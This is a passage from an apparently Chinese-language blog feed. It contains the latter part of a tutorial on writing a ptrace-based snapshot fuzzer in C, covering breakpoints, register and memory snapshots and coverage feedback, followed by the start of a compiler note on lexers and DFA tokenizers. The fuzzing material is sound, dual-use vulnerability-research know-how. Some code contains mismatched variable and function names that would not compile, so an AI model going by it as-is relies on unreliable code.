class="keyword">if</span> (value == <span class="number">-1</span> &amp;&amp; errno != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;dragonfly&gt; Error (%d) during &quot;</span>, errno);</span><br><span class="line">        perror(<span class="string">&quot;ptrace&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(errno);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入断点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_breakpoint</span><span class="params">(<span class="type">long</span> <span class="type">long</span> <span class="type">unsigned</span> bp_address, <span class="type">long</span> <span class="type">long</span> <span class="type">unsigned</span> original_value, <span class="type">pid_t</span> child_pid)</span> &#123;</span><br><span class="line"></span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//我们获取那一个字节的值，我们将在地址处提取64比特长度的值，但只关心最右字节的值</span></span><br><span class="line"><span class="comment">//将取前面函数收集到的原始值，并执行两个按位操作以保持前7个字节不变，</span></span><br><span class="line"><span class="comment">//然后将最后一个字节替换为\xCC</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">unsigned</span> breakpoint = (original_value &amp; <span class="number">0xFFFFFFFFFFFFFF00</span> | <span class="number">0xCC</span>);</span><br><span class="line">    <span class="type">int</span> ptrace_result = ptrace(PTRACE_POKETEXT, child_pid, (<span class="type">void</span>*)bp_address, (<span class="type">void</span>*)breakpoint);</span><br><span class="line">    <span class="keyword">if</span> (ptrace_result == <span class="number">-1</span> &amp;&amp; errno != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;dragonfly&gt; Error (%d) during &quot;</span>, errno);</span><br><span class="line">        perror(<span class="string">&quot;ptrace&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(errno);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除断点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">revert_breakpoint</span><span class="params">(<span class="type">long</span> <span class="type">long</span> <span class="type">unsigned</span> bp_address,<span class="type">long</span> <span class="type">long</span> <span class="type">unsigned</span> original_value ,<span class="type">pid_t</span> child_pid)</span></span><br><span class="line">&#123;</span><br><span class="line">errno = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> ptarce_result = ptrace(PTRACE_POKETEXT , child_pid ,(<span class="type">void</span>*)bp_address , (<span class="type">void</span>*)original_value);</span><br><span class="line"><span class="keyword">if</span> (ptrace_result == <span class="number">-1</span> &amp;&amp; errno != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;dragonfly&gt; Error (%d) during &quot;</span>, errno);</span><br><span class="line">        perror(<span class="string">&quot;ptrace&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(errno);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果我们在地址0x000000000000000命中一个断点，rip实际上将在0x0000000000000001。</span></span><br><span class="line"><span class="comment">//因此，在将被覆盖的指令恢复到之前的值之后，我们还需要在恢复执行之前从rip中减去1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>12.使用ptrace创建寄存器状态快照</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//取回寄存器状态</span></span><br><span class="line"><span class="keyword">struct</span> user_regs_struct <span class="title function_">get_regs</span><span class="params">(<span class="type">pid_t</span> child_pid , <span class="keyword">struct</span> user_regs_struct registers)</span>&#123;</span><br><span class="line"><span class="comment">//ptrace能够捕获和设置被调试进程中的寄存器状态</span></span><br><span class="line"><span class="type">int</span> ptrace_result = ptrace(PTRACE_GETREGS , child_pid , <span class="number">0</span> ,&amp;registers);</span><br><span class="line"><span class="keyword">if</span> (ptrace_result == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;dragonfly&gt; Error (%d) during &quot;</span>, errno); </span><br><span class="line">        perror(<span class="string">&quot;ptrace&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(errno);      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> registers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置寄存器的值</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_reg</span><span class="params">(<span class="type">pid_t</span> child_pid,<span class="keyword">struct</span> user_regs_struct registers)</span>&#123;</span><br><span class="line"><span class="type">int</span> ptrace_result = ptrace(PTRACE_SETREGS , child_pid , <span class="number">0</span> , &amp;registers);</span><br><span class="line"><span class="keyword">if</span> (ptrace_result == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;dragonfly&gt; Error (%d) during &quot;</span>, errno);</span><br><span class="line">        perror(<span class="string">&quot;ptrace&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(errno);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>13.使用&#x2F;proc创建可写内存段状态快照</p><p>  <code>cat /proc/$pid/maps</code>以查看内存是如何在进程中映射的，<code>|grep rw</code><br>  筛选出可以读写的内存区段（即可以使用我们的模糊测试样例覆盖的地方)</p><p>  然后打开<code>/proc/$pid/mem</code>并从这些偏移量中读取缓冲区以存储可写内存</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//该文件包含一些用于捕获快照和恢复快照的定义和函数</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* <span class="title function_">create_snapshot</span><span class="params">(<span class="type">pid_t</span> child_pid)</span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SNAPSHOT_MEMORY</span> <span class="title">read_memory</span> =</span> &#123;</span><br><span class="line"><span class="comment">// cat /proc/$pid/maps读取出来的maps_offset </span></span><br><span class="line">            <span class="number">0x555555756000</span>,</span><br><span class="line">            <span class="number">0x7ffff7dcf000</span>,</span><br><span class="line">            <span class="number">0x7ffff7dd1000</span>,</span><br><span class="line">            <span class="number">0x7ffff7fe0000</span>,</span><br><span class="line">            <span class="number">0x7ffff7ffd000</span>,</span><br><span class="line">            <span class="number">0x7ffff7ffe000</span>,</span><br><span class="line">            <span class="number">0x7ffffffde000</span></span><br><span class="line"></span><br><span class="line">&#125;,&#123;</span><br><span class="line"><span class="comment">// /proc/$pid/mem读取的snapshot_buf_offset</span></span><br><span class="line"><span class="number">0x0</span>,</span><br><span class="line">            <span class="number">0xFFF</span>,</span><br><span class="line">            <span class="number">0x2FFF</span>,</span><br><span class="line">            <span class="number">0x6FFF</span>,</span><br><span class="line">            <span class="number">0x8FFF</span>,</span><br><span class="line">            <span class="number">0x9FFF</span>,</span><br><span class="line">            <span class="number">0xAFFF</span></span><br><span class="line"></span><br><span class="line">&#125;,&#123;</span><br><span class="line">            <span class="comment">// 各节的长度 rdwr length</span></span><br><span class="line">            <span class="number">0x1000</span>,</span><br><span class="line">            <span class="number">0x2000</span>,</span><br><span class="line">            <span class="number">0x4000</span>,</span><br><span class="line">            <span class="number">0x2000</span>,</span><br><span class="line">            <span class="number">0x1000</span>,</span><br><span class="line">            <span class="number">0x1000</span>,</span><br><span class="line">            <span class="number">0x21000</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* snapshot_buf  = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x2C000</span>);</span><br><span class="line"><span class="type">char</span> proc_mem[<span class="number">0x20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">sprintf</span>(proc_mem,<span class="string">&quot;/proc/%d/mem&quot;</span>,child_pid);</span><br><span class="line"><span class="comment">//打开/proc/%d/mem的可读权限</span></span><br><span class="line"><span class="type">int</span> mem_fd = open(proc_mem , O_RDONLY);</span><br><span class="line"><span class="keyword">if</span> (mem_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;dragonfly&gt; Error (%d) during &quot;</span>, errno);</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(errno);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="type">int</span> lseek_result , bytes_read;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">7</span> ; i++)&#123;</span><br><span class="line"><span class="comment">//循环这7个偏移量和长度，并把它们都写进一个名为snapshot_buf的缓冲区，</span></span><br><span class="line"><span class="comment">//它将存储在我们的模糊测试器的内存堆中</span></span><br><span class="line">lssek_result = lseek(mem_fd , read_memory.maps_offset[i] , SEEK_SET);</span><br><span class="line"><span class="keyword">if</span> (lseek_result == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;dragonfly&gt; Error (%d) during &quot;</span>, errno);</span><br><span class="line">            perror(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(errno);</span><br><span class="line">        &#125;</span><br><span class="line">bytes_read = read(mem_fd , (<span class="type">unsigned</span> <span class="type">char</span>*)(snapshot_buf + </span><br><span class="line">read_memory.snapshot_buf_offset[i]),read_memory.rdwr_length[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bytes_read == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;dragonfly&gt; Error (%d) during &quot;</span>, errno);</span><br><span class="line">            perror(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(errno);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">close(mem_fd);</span><br><span class="line"><span class="keyword">return</span> snapshot_buf;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  所以现在我们有了进程从<code>check_one</code>开始时的寄存器状态和内存状态。（我们的<code>start</code><br>  断点）</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建恢复快照</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">restore_snapshot</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* snapshot_buf ,<span class="type">pid_t</span> child_pid)</span>&#123;</span><br><span class="line"><span class="type">ssize_t</span> bytes_written = <span class="number">0</span> ;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读出snapshot_buf里的7的不同的偏移</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">local</span>[7];</span></span><br><span class="line"><span class="comment">//写入snapshot_buf里的7的不同的偏移</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">remote</span>[7];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//将从我们在snapshot_buf中保存的原始快照数据按照规定的偏移量覆写到进程的/proc/$pid/maps</span></span><br><span class="line"><span class="comment">//将之前从proc/$pid/mem读的所有非堆区的可写内存放进local</span></span><br><span class="line">local[<span class="number">0</span>].iov_base = snapshot_buf;</span><br><span class="line">    local[<span class="number">0</span>].iov_len = <span class="number">0x1000</span>;</span><br><span class="line">    local[<span class="number">1</span>].iov_base = (<span class="type">unsigned</span> <span class="type">char</span>*)(snapshot_buf + <span class="number">0xFFF</span>);</span><br><span class="line">    local[<span class="number">1</span>].iov_len = <span class="number">0x2000</span>;</span><br><span class="line">    local[<span class="number">2</span>].iov_base = (<span class="type">unsigned</span> <span class="type">char</span>*)(snapshot_buf + <span class="number">0x2FFF</span>);</span><br><span class="line">    local[<span class="number">2</span>].iov_len = <span class="number">0x4000</span>;</span><br><span class="line">    local[<span class="number">3</span>].iov_base = (<span class="type">unsigned</span> <span class="type">char</span>*)(snapshot_buf + <span class="number">0x6FFF</span>);</span><br><span class="line">    local[<span class="number">3</span>].iov_len = <span class="number">0x2000</span>;</span><br><span class="line">    local[<span class="number">4</span>].iov_base = (<span class="type">unsigned</span> <span class="type">char</span>*)(snapshot_buf + <span class="number">0x8FFF</span>);</span><br><span class="line">    local[<span class="number">4</span>].iov_len = <span class="number">0x1000</span>;</span><br><span class="line">    local[<span class="number">5</span>].iov_base = (<span class="type">unsigned</span> <span class="type">char</span>*)(snapshot_buf + <span class="number">0x9FFF</span>);</span><br><span class="line">    local[<span class="number">5</span>].iov_len = <span class="number">0x1000</span>;</span><br><span class="line">    local[<span class="number">6</span>].iov_base = (<span class="type">unsigned</span> <span class="type">char</span>*)(snapshot_buf + <span class="number">0xAFFF</span>);</span><br><span class="line">    local[<span class="number">6</span>].iov_len = <span class="number">0x21000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//硬编码从/proc/pid/maps手收集的可写内存地址和长度</span></span><br><span class="line">    remote[<span class="number">0</span>].iov_base = (<span class="type">void</span>*)<span class="number">0x555555756000</span>;</span><br><span class="line">    remote[<span class="number">0</span>].iov_len = <span class="number">0x1000</span>;</span><br><span class="line">    remote[<span class="number">1</span>].iov_base = (<span class="type">void</span>*)<span class="number">0x7ffff7dcf000</span>;</span><br><span class="line">    remote[<span class="number">1</span>].iov_len = <span class="number">0x2000</span>;</span><br><span class="line">    remote[<span class="number">2</span>].iov_base = (<span class="type">void</span>*)<span class="number">0x7ffff7dd1000</span>;</span><br><span class="line">    remote[<span class="number">2</span>].iov_len = <span class="number">0x4000</span>;</span><br><span class="line">    remote[<span class="number">3</span>].iov_base = (<span class="type">void</span>*)<span class="number">0x7ffff7fe0000</span>;</span><br><span class="line">    remote[<span class="number">3</span>].iov_len = <span class="number">0x2000</span>;</span><br><span class="line">    remote[<span class="number">4</span>].iov_base = (<span class="type">void</span>*)<span class="number">0x7ffff7ffd000</span>;</span><br><span class="line">    remote[<span class="number">4</span>].iov_len = <span class="number">0x1000</span>;</span><br><span class="line">    remote[<span class="number">5</span>].iov_base = (<span class="type">void</span>*)<span class="number">0x7ffff7ffe000</span>;</span><br><span class="line">    remote[<span class="number">5</span>].iov_len = <span class="number">0x1000</span>;</span><br><span class="line">    remote[<span class="number">6</span>].iov_base = (<span class="type">void</span>*)<span class="number">0x7ffffffde000</span>;</span><br><span class="line">    remote[<span class="number">6</span>].iov_len = <span class="number">0x21000</span>;</span><br><span class="line"></span><br><span class="line">bytes_written = process_vm_writev(child_pid, local, <span class="number">7</span>, remote, <span class="number">7</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ptrace_helpers函数里恢复一下寄存器</span></span><br><span class="line"><span class="comment">// restore writable memory from /proc/$pid/maps to its state at Start</span></span><br><span class="line">restore_snapshot(snapshot_buf, child_pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">// restore registers to their state at Start</span></span><br><span class="line">set_regs(child_pid, snapshot_registers);</span><br></pre></td></tr></table></figure></li><li><p>14.编写代码覆盖率反馈机制</p><p>  在从<code>check_two</code>到<code>check_three</code>的入口点放置“动态”（用来统计代码覆盖率的）断点。当到达一个“动态”断点时，我们将到达代码的输入保存到一个名为<code>corpus</code>的<code>char</code>指针数组中，现在我们可以开始对那些保存到<code>corpus</code>的输入作为种子进行变异，不仅仅是对我们的“原型”<code>Canon_40D.jpg</code>输入进行变异。具体如下：</p><ol><li>用<strong>原始数据</strong>作为种子进行变异作为测试样例插入<strong>内存堆</strong>中</li><li>恢复被测试进程继续运行</li><li>如果触发“动态”断点，则将输入保存到<strong>语料库</strong>中</li><li>如果语料库中保存的语料数量大于1，则下一次生成测试样例将从原始数据和语料库中随机选择一个作为变异种子，然后从步骤1开始重复</li></ol><ul><li><p>跟踪基本块</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//输入一个unsigned char 的buff</span></span><br><span class="line"><span class="keyword">if</span> (input[<span class="number">0x9</span>] &lt; <span class="number">220</span>)&#123;</span><br><span class="line">parsing_routine_1(input);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">parsing_routine_2(input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  假如输入200的时候，将进入parsing_routine_1，我们删除parsing_routine_1入口处的断点，并将到达它的输入添加到语料库中；<strong>但输入220时，会进入到parsing_routine_2，而且进入到parsing_routine_2的值将永远是220，</strong>因为我们删除了这个断点，我们将不会把其他能触发到这个断点的值保存到语料库中。解决办法是定期重新实例化所有断点</p></li><li><p>跟踪边缘和路径</p><p>  AFL++对于覆盖率统计数据的展示同时引用了基于基本块和基于边缘的隐式计数器。</p>  <img src="/2022/07/09/A-simple-fuzzer/Untitled1.png" class title="Untitled"><p>  为了跟踪边缘信息，AFL使用了一个元组来保存有关系的基本块地址。例如如果没有提供正确数量的命令行参数而从块<code>0x001006cf</code>转到块<code>0x001006e4</code>那么这个元组<code>(0x001006cf, 0x001006e4)</code>将被添加到AFL++中用于跟踪边缘路径信息的元组映射中。让我们跟踪一下在程序中遍历整个路径时要注册的元组：0x001006cf -&gt; 0x00100706 -&gt; 0x00100722，如果采用上述路径，我们可以制定覆盖率数据的两个元组：（<code>0x001006cf</code>，<code>0x00100706</code>）和（<code>0x00100706</code>，<code>0x00100722</code>），可以在AFL的覆盖率数据中查找是否探索过这些元组，此外还跟踪探索每条边到达和探索的频率，AFL通过在编译目标时插桩来获取这些数据，也就是如果你用AFL编译目标代码，AFL将在其中嵌入一些汇编代码。</p><p>  AFL针对二进制数据的目标主要通过QEMU来收集类似的覆盖率数据，当块被JIT(运行时)到本机代码并存储在缓存中，以便之后的执行用到，所以QEMU运行到一个基本块时，它可以检查这个块是否已经编译过，AFL就可以利用这个缓存来跟踪正在执行的块，并获得与源代码插桩编译模式相似的数据。QEMU将预先计算找出直接跳转一些列的基本块并将它们编译成一个完整的块以加快处理速度，QEMU中称为“基本块链”。</p></li><li><p>比较覆盖率&#x2F;细粒度比较</p></li></ul><p>  改进：</p><ul><li>通过重构代码，更改全局变量的位置来优化性能</li><li>可以通过Python脚本创建配置文件来使得模糊测试器拥有动态配置的功能</li><li>采用更多的变异方法</li><li>采用更多的代码覆盖机制</li><li>开发可并行化运行实例的模糊测试器，使得多个并行化实例副本共享发现的输入&#x2F;覆盖数据</li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CompilerNote</title>
      <link href="/2022/07/08/CompilerNote/"/>
      <url>/2022/07/08/CompilerNote/</url>
      
        <content type="html"><![CDATA[<img src="/2022/07/08/CompilerNote/Untitled.png" class title="Untitled"><h1 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h1><ul><li><p>编写词法分析器</p><p>  Lex（或其 GNU 版本，Flex）：词法分析器的生成工具，基于一些规则来工作的，这些规则用“正则文法”表达，符合正则文法的表达式称为“正则表达式”。生成工具可以读入正则表达式，生成一种叫“有限自动机”的算法，来完成具体的词法分析工作。</p><p>  有限自动机 ：例如，词法分析程序在扫描 age 的时候，处于“标识符”状态，等它遇到一个 &gt; 符号，就切换到“比较操作符”的状态。词法分析过程，就是这样一个个状态迁移的过程。</p>  <img src="/2022/07/08/CompilerNote/Untitled1.png" class title="Untitled"><p>  词法分析 Token : </p><ul><li>关键字：表示数据类型的 int、char，表示程序结构的 while、if，表述特殊数据取值的 null、NAN</li><li>标识符 Identifier ：main、printf、age</li><li>操作符号：+、-、&#x3D;、{、（、</li><li>字面量 IntLiteral ：数字、字符串</li><li>保留字</li></ul>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4个Token正则</span></span><br><span class="line">Id :        [a-zA-Z_] ([a-zA-Z_] | [<span class="number">0</span><span class="number">-9</span>])*</span><br><span class="line">IntLiteral: [<span class="number">0</span><span class="number">-9</span>]+</span><br><span class="line">GT :        <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">GE :        <span class="string">&#x27;&gt;=&#x27;</span></span><br></pre></td></tr></table></figure>  <img src="/2022/07/08/CompilerNote/Untitled2.png" class title="Untitled"><p>  <strong>1. 初始状态：</strong>刚开始启动词法分析的时候，程序所处的状态。</p><p>  <strong>2. 标识符状态：</strong>在初始状态时，当第一个字符是字母的时候，迁移到状态 2。当后续字符是字母和数字时，保留在状态 2。如果不是，就离开状态 2，写下该 Token，回到初始状态。</p><p>  <strong>3. 大于操作符（GT）：</strong>在初始状态时，当第一个字符是 &gt; 时，进入这个状态。它是比较操作符的一种情况。</p><p>  <strong>4. 大于等于操作符（GE）：</strong>如果状态 3 的下一个字符是 &#x3D;，就进入状态 4，变成 &gt;&#x3D;。它也是比较操作符的一种情况。</p><p>  <strong>5. 数字字面量：</strong>在初始状态时，下一个字符是数字，进入这个状态。如果后续仍是数字，就保持在状态 5。</p><p>  圆圈双线的意思是这个状态已经是一个合法的 Token 了，单线的意思是这个状态还是临时状态。</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">DfaState newState = DfaState.Initial;</span><br><span class="line"><span class="keyword">if</span>(isAlpha(ch))&#123;                  <span class="comment">// 第一个字符是字母    </span></span><br><span class="line"><span class="keyword">if</span> (ch == <span class="string">&#x27;i&#x27;</span>) &#123;</span><br><span class="line">        newState = DfaState.Id_int1;  <span class="comment">// 对字符 i 特殊处理</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        newState = DfaState.Id;</span><br><span class="line">    &#125;                                     <span class="comment">//接下来要进入的状态，枚举（enum）类型</span></span><br><span class="line">token.type = TokenType.Identifier;<span class="comment">//Token 的类型，是枚举类型的值</span></span><br><span class="line">tokenText.append(ch); <span class="comment">//Token 的文本值</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(isDigit(ch))&#123;           <span class="comment">// 第一个字符是数字</span></span><br><span class="line">newState = DfaState.IntLiteral;</span><br><span class="line">    token.type = TokenType.IntLiteral;</span><br><span class="line">    tokenText.append(ch);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27;&gt;&#x27;</span>) &#123;         <span class="comment">// 第一个字符是 &gt;</span></span><br><span class="line">    newState = DfaState.GT;</span><br><span class="line">    token.type = TokenType.GT;</span><br><span class="line">    tokenText.append(ch);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//进入235之后的状态迁移</span></span><br><span class="line"><span class="keyword">case</span> Initial:</span><br><span class="line">    state = initToken(ch);          <span class="comment">// 重新确定后续状态</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> Id:</span><br><span class="line">    <span class="keyword">if</span> (isAlpha(ch) || isDigit(ch)) &#123;</span><br><span class="line">        tokenText.append(ch);       <span class="comment">// 保持标识符状态</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        state = initToken(ch); <span class="comment">// 退出标识符状态，并保存 Token</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> GT:</span><br><span class="line">    <span class="keyword">if</span> (ch == <span class="string">&#x27;=&#x27;</span>) &#123;</span><br><span class="line">        token.type = TokenType.GE;  <span class="comment">// 转换成 GE</span></span><br><span class="line">        state = DfaState.GE;</span><br><span class="line">        tokenText.append(ch);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        state = initToken(ch);      <span class="comment">// 退出 GT 状态，并保存 Token</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> GE:</span><br><span class="line">    state = initToken(ch);        <span class="comment">// 退出当前状态，并保存 Token</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> IntLiteral:</span><br><span class="line">    <span class="keyword">if</span> (isDigit(ch)) &#123;</span><br><span class="line">        tokenText.append(ch);    <span class="comment">// 继续保持在数字字面量状态</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        state = initToken(ch);    <span class="comment">// 退出当前状态，并保存 Token</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>  上面代码有很多冲突：</p><p>  <strong>如何把关键字和保留字跟标识符区分开呢？</strong>以“int age &#x3D; 40”为例，我们把有限自动机修改成下面的样子，借此解决关键字和标识符的冲突。</p>  <img src="/2022/07/08/CompilerNote/Untitled3.png" class title="Untitled"><ul><li><p>使用Antlr编写词法分析器</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 